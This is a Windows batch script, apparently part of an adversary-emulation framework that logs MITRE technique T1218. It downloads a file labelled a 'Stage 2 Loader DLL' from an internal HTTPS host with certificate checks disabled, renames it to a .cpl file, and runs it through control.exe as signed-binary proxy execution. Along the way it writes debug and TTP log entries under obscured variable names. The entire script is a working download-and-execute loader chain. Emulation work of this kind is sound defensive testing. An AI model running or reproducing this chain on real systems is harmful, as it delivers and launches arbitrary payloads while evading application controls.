@echo off
setlocal enabledelayedexpansion

REM Declare random-named SET vars for all PHR placeholders
SET plkmjw=BALAM-S2B
SET qazwsx=10457
SET rfvtgb=7
SET yhnmju=%APPDATA%\10457\066073ab
SET ikmjuo=107a8632.txt
SET pzctus=https://10.0.0.49/stage/2/icon.png?10457-7
SET xrtmia=%APPDATA%\7\macula-simulations.log

REM Set log file path from %APPDATA%\7\macula-simulations.log variable
SET log_file=!xrtmia!

REM Create parent directory of log file if it does not exist
for %%F in ("!log_file!") do (
    if not exist "%%~dpF" mkdir "%%~dpF" 2>nul
)

REM Cache local timestamp for debug logging
SET tsvar=!DATE!/!TIME!

REM DEBUG: heartbeat/alive check start
echo [!tsvar!][DEBUG][!plkmjw!][!qazwsx!]: heartbeat_start>> "!log_file!" 2>nul

REM Heartbeat fetch – download Stage 2 Loader DLL
curl -k -s -o "!yhnmju!\!ikmjuo!" "!pzctus!"

REM DEBUG: heartbeat complete
echo [!tsvar!][DEBUG][!plkmjw!][!qazwsx!]: heartbeat_complete>> "!log_file!" 2>nul

REM DEBUG: chdir start
echo [!tsvar!][DEBUG][!plkmjw!][!qazwsx!]: chdir_start>> "!log_file!" 2>nul

REM Change working directory to output directory
cd /d "!yhnmju!" >nul 2>&1

REM DEBUG: chdir result
echo [!tsvar!][DEBUG][!plkmjw!][!qazwsx!]: chdir_result=0>> "!log_file!" 2>nul

REM DEBUG: rename start
echo [!tsvar!][DEBUG][!plkmjw!][!qazwsx!]: rename_start>> "!log_file!" 2>nul

REM Rename DLL to .cpl for control.exe proxy execution
ren "!ikmjuo!" "!ikmjuo!.cpl"

REM DEBUG: rename result
echo [!tsvar!][DEBUG][!plkmjw!][!qazwsx!]: rename_result=0>> "!log_file!" 2>nul

REM DEBUG: process start (control.exe)
echo [!tsvar!][DEBUG][!plkmjw!][!qazwsx!]: control_start>> "!log_file!" 2>nul

REM Execute renamed DLL via control.exe (signed LOLBIN)
control.exe "!ikmjuo!.cpl" >nul 2>&1
SET lasterror=!errorlevel!

REM DEBUG: process result
echo [!tsvar!][DEBUG][!plkmjw!][!qazwsx!]: control_result=!lasterror!>> "!log_file!" 2>nul

REM TTP log: System Binary Proxy Execution
if !lasterror! equ 0 (
    echo [!tsvar!][TTP][!plkmjw!][!qazwsx!]: T1218^|System Binary Proxy Execution=[OK]:[] >> "!log_file!" 2>nul
) else (
    echo [!tsvar!][TTP][!plkmjw!][!qazwsx!]: T1218^|System Binary Proxy Execution=[FAIL]:[lolbin_execution_failed] >> "!log_file!" 2>nul
)

endlocal
exit /b 0